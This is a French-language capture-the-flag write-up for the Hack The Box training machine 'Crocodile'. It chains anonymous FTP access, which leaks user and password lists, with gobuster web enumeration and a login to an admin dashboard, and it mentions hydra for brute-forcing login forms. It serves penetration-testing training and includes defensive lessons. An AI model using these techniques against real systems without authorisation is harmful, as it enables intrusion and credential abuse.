# Crocodile — HTB Starting Point (Tier 1)

| | |
|---|---|
| **Section** | Starting Point — Tier 1 |
| **Machine** | `Crocodile` |
| **OS** | Linux (Ubuntu) |
| **IP cible** | `10.129.159.181` *(change à chaque spawn)* |
| **Difficulté** | Very Easy |
| **Date** | 2026-11-02 |
| **Résultat** | flag ✅ |

---

## TL;DR — chaîne d'attaque (2 étapes chaînées)

```
nmap  →  21 FTP (anon) + 80 HTTP (Apache)
      →  FTP anonyme : get allowed.userlist + allowed.userlist.passwd  (users + mots de passe !)
      →  gobuster sur le site : decouvre /login.php + /dashboard
      →  login web avec un couple user/pass de la liste (admin : rKXM59ESxesUFHAd)
      →  dashboard  →  flag
```

C'est le premier **chaînage** : des creds trouvés sur un service (FTP) réutilisés sur un autre (web).

---

## 1. Reconnaissance

```bash
box crocodile <IP>
nmap -Pn -sV -sC -oN nmap/initial $IP
```

| Port | Service | Détail |
|---|---|---|
| 21/tcp | ftp | vsftpd 3.0.3 — **anonymous login allowed** |
| 80/tcp | http | Apache 2.4.41 — *Smash Bootstrap Business Template* |

Le script `ftp-anon` liste déjà deux fichiers parlants :

```
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r-- allowed.userlist
|_-rw-r--r-- allowed.userlist.passwd
```

Deux services + des fichiers "userlist/passwd" → l'idée du chaînage saute aux yeux.

---

## 2. Étape 1 — récupérer les identifiants (FTP anonyme)

```bash
ftp anonymous@$IP        # mot de passe vide
```
```
ftp> get allowed.userlist
ftp> get allowed.userlist.passwd
ftp> exit
```

> Note : `ftp root@$IP` → `530 This FTP server is anonymous only`. Il faut bien l'utilisateur **anonymous**.

Contenu :

```
# allowed.userlist            # allowed.userlist.passwd
aron                          root
pwnmeow                       Supersecretpassword1
egotisticalsw                 @BaASD&9032123sADS
admin                         rKXM59ESxesUFHAd
```

→ une liste de **users** et une liste de **mots de passe** (non appariés : à tester en combinaisons).

---

## 3. Étape 2 — énumération web + login

Le site n'a pas de login visible en page d'accueil → on **énumère les chemins cachés** :

```bash
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x php,xml
```

Résultats utiles :

```
/login.php      (200)
/dashboard      (301)
/config.php     (200, vide)
/logout.php     (302 -> login.php)
```

→ page de connexion sur **`/login.php`**. On y teste les identifiants de la liste. Le couple qui fonctionne :

```
utilisateur : admin
mot de passe : rKXM59ESxesUFHAd
```

Connexion → redirection vers **`/dashboard`** → le **flag** y est affiché.

> Pour automatiser le test des combinaisons, `hydra` sait brute-forcer un formulaire HTTP POST (`hydra -L users -P passwords $IP http-post-form ...`). Ici, 4×4 = 16 essais, plus rapide à la main.

---

## 4. Leçons à retenir

- **Chaînage de failles** : une info récoltée sur un service (creds en FTP) devient la clé d'un autre (login web). C'est le cœur du pentest, au-delà de la faille unique.
- **FTP anonyme = fuite de données** : ne jamais y laisser de fichiers sensibles (ici, des identifiants en clair).
- **Énumération web obligatoire** : ce qui n'est pas lié depuis la page d'accueil (`/login.php`, `/dashboard`) se trouve avec `gobuster`/`ffuf`. Réflexe systématique sur tout port 80/443.
- **Users ≠ passwords appariés** : deux listes séparées = tester les combinaisons (manuellement si peu, `hydra` sinon).
- **Lire la sortie `-sC`** : `ftp-anon` avait déjà listé les fichiers — la moitié du travail de recon était faite.

---

## Commandes — récap express

```bash
box crocodile <IP>
nmap -Pn -sV -sC -oN nmap/initial $IP            # 21 FTP anon + 80 HTTP
ftp anonymous@$IP                                 # get allowed.userlist*
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x php,xml
# -> http://$IP/login.php  ->  admin : rKXM59ESxesUFHAd  ->  /dashboard  ->  flag
```
